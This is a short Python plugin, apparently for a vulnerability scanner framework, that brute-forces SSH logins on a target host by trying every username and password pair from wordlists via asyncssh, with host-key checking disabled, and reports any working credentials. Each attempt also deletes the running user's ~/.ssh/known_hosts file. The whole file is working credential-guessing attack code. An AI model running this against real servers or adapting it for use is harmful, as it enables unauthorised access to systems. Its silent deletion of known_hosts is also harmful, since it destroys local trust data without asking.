#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author = 'orleven'

import sys
import os
import asyncssh
from script import Script, SERVICE_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.SSH
        self.name = 'ssh burst'
        self.keyword = ['ssh', 'burst']
        self.info = 'Burst ssh weakpass.'
        self.type = 'weakpass'
        self.level = 'high'
        Script.__init__(self, target=target, service_type=self.service_type)


    async def prove(self):
        usernamedic = self.read_file(self.parameter['U']) if 'U' in self.parameter.keys() else self.read_file(
            'dict/ssh_usernames.txt')
        passworddic = self.read_file(self.parameter['P']) if 'P' in self.parameter.keys() else self.read_file(
            'dict/ssh_passwords.txt')
        async for (username, password) in self.generate_dict(usernamedic, passworddic):
            known_hosts_path = os.path.join(os.path.expanduser('~'), '.ssh', 'known_hosts')
            if os.path.exists(known_hosts_path):
                os.remove(known_hosts_path)
            try:
                async with asyncssh.connect(host=self.target_host, port=self.target_port, username=username,
                                            password=password, known_hosts=None) as conn:
                    self.flag = 1
                    self.res.append({"info": username + "/" + password, "key": "ssh burst"})
                    return
            except:
                pass